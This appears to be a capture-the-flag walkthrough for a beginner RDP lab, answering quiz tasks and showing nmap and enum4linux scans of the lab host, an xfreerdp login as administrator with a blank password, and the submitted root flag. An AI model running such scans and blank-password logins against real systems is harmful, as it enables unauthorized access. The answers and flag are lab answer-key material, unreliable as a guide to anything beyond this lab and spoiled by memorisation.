Connect the VPN, spawn the VM.<br>
10.129.196.22

### Task 1:
What does the 3-letter acronym RDP stand for?<br>
Answer: Remote Desktop Protocol

### Task 2:
What is a 3-letter acronym that refers to interaction with the host through a command line interface?<br>
Answer: cli

### Task 3:
What about graphical user interface interactions?<br>
Answer: GUI

### Task 4:
What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23?<br>
Answer: Telnet

### TASK 5
What is the name of the service running on port 3389 TCP?<br>
Running the command<br>
```
nmap -sS 10.129.196.22 -sV -p3389 -n -Pn
```

Gives the output:<br>
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 17:01 EDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.129.196.22
Host is up (0.24s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
```

Answer: ms-wbt-server<br>

### TASK 6
What is the switch used to specify the target host's IP address when using xfreerdp?<br>
```
xfreerdp --help
```
gives the help, allowing us to see the relevant switches<br>
Answer:/v

### TASK 7
What username successfully returns a desktop projection to us with a blank password?<br>
Run the command:<br>
```
enum4linux -a 10.129.196.22
```

Gives the output:<br>
```
 =========================================( Target Information )=========================================

Target ........... 10.129.196.22
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
```

Running the command<br>
```
xfreerdp /v:10.129.196.22 /u:administrator
```
Accepting the certificate prompt, and entering a blank password allowed the connection.<br>

Answer: Administrator

### SUBMIT FLAG
Submit root flag<br>

The flag is on the desktop of the administrator account.<br>

Answer: 951fa96d7830c451b536be5a6be008a0<br>